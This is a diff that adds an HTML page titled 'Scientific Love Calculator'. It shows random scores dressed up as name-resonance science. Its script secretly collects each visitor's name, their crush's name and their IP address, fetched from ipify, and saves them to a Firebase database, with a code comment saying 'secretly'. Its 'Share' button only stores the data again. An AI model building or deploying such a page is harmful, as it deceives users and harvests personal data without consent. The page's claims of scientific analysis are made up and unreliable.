@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>💖 Scientific Love Calculator 💖</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .calculator {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        h1 {
+            color: #d23669;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #ffcad4;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #d23669;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #a51a4a;
+            transform: translateY(-2px);
+        }
+        #result {
+            margin-top: 25px;
+            display: none;
+        }
+        .percentage {
+            font-size: 60px;
+            font-weight: bold;
+            color: #d23669;
+            margin: 15px 0;
+            text-shadow: 0 3px 6px rgba(210, 54, 105, 0.2);
+        }
+        .analysis {
+            background: #fff5f7;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(210, 54, 105, 0.3);
+            border-radius: 50%;
+            border-top-color: #d23669;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        #shareBtn {
+            background: #4285f4;
+            display: none;
+            margin-top: 10px;
+        }
+        #shareBtn:hover {
+            background: #3367d6;
+        }
+    </style>
+</head>
+<body>
+    <div class="calculator">
+        <h1>🔬 Scientific Love Compatibility Test</h1>
+        <p>Discover your true connection based on name resonance theory</p>
+        
+        <form id="loveForm">
+            <input type="text" id="yourName" placeholder="Your full name" required>
+            <input type="text" id="crushName" placeholder="Crush's full name" required>
+            <button type="submit" id="submitBtn">
+                <span id="btnText">Calculate Compatibility</span>
+                <span id="btnLoading" class="loading" style="display: none;"></span>
+            </button>
+        </form>
+        
+        <div id="result">
+            <div class="percentage" id="compatibility">0%</div>
+            <div class="analysis" id="analysisText">
+                <p>Our advanced algorithm analyzed:</p>
+                <ul>
+                    <li>Name vibration frequencies</li>
+                    <li>Astrological letter alignment</li>
+                    <li>Subconscious phonetic attraction</li>
+                </ul>
+            </div>
+            <button id="shareBtn">📤 Share Your Result</button>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
+    
+    <script>
+        // Replace with your Firebase config
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Store user data globally
+        let userData = {
+            yourName: "",
+            crushName: "",
+            percent: 0,
+            ip: ""
+        };
+
+        // Get IP address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return "unknown";
+            }
+        }
+
+        document.getElementById('loveForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            userData.yourName = document.getElementById('yourName').value.trim();
+            userData.crushName = document.getElementById('crushName').value.trim();
+            userData.ip = await getIP();
+            
+            // Show loading state
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('btnLoading').style.display = 'inline-block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Generate random percentage (70-98%)
+            userData.percent = Math.floor(Math.random() * 29) + 70;
+            
+            // Save to Firebase (secretly)
+            try {
+                await db.collection("loveTests").add({
+                    yourName: userData.yourName,
+                    crushName: userData.crushName,
+                    percent: userData.percent,
+                    timestamp: new Date(),
+                    ip: userData.ip
+                });
+            } catch (err) {
+                console.log("Error saving data:", err);
+            }
+            
+            // Show result after delay
+            setTimeout(() => {
+                document.getElementById('compatibility').textContent = `${userData.percent}%`;
+                
+                // Generate scientific-sounding analysis
+                const analyses = [
+                    `The harmonic resonance between ${userData.yourName} and ${userData.crushName} shows exceptional compatibility.`,
+                    `Our phoneme analysis reveals a ${userData.percent}% match in vocal attraction markers.`,
+                    `Quantum entanglement probability scores in the top ${100-userData.percent}% of tested pairs.`
+                ];
+                document.getElementById('analysisText').innerHTML += 
+                    `<p><strong>Analysis:</strong> ${analyses[Math.floor(Math.random() * analyses.length)]}</p>`;
+                
+                // Show result and share button
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('shareBtn').style.display = 'block';
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('btnLoading').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
+            }, 3000);
+        });
+
+        // Share button (actually just saves the data again)
+        document.getElementById('shareBtn').addEventListener('click', async () => {
+            document.getElementById('shareBtn').textContent = "Saving...";
+            try {
+                await db.collection("sharedResults").add({
+                    yourName: userData.yourName,
+                    crushName: userData.crushName,
+                    percent: userData.percent,
+                    timestamp: new Date(),
+                    ip: userData.ip
+                });
+                document.getElementById('shareBtn').textContent = "✅ Shared!";
+            } catch (err) {
+                document.getElementById('shareBtn').textContent = "❌ Try Again";
+                console.log("Error sharing:", err);
+            }
+        });
+    </script>
+</body>
+</html>
